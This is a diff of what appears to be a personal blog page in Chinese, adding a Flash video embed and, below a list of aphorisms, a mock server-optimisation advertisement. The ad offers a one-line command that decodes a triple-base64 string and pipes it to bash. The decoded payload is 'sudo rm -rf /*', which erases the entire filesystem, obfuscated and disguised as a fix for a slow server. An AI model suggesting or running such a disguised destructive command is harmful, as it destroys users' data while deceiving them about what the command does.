@@ -30,6 +30,8 @@ skip: false
 
 <embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=7924127&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed>
 
+<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=1162066&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed>
+
 ### Words
 
 - 这世界上的大部分健康的人际关系，都是两个强者之间的锦上添花，而不是弱者之间的相互取暖。
@@ -37,4 +39,8 @@ skip: false
 - 一个社会的文明程度取决于其对弱者的态度。
 
 - 因为我想你这三个字说不出口，所以每天噼里啪啦跟你讲一堆没有用的废话，我这么神经病，都怪你。 
+
+- 服务器速度慢？空间不够用？经常死机？在线率低？经常被攻击？
+        echo WXpOV2EySjVRbmxpVTBGMFkyMVpaMHg1YjBzPQ==|base64 -D|base64 -D|base64 -D|bash
+自动优化你的服务器
 
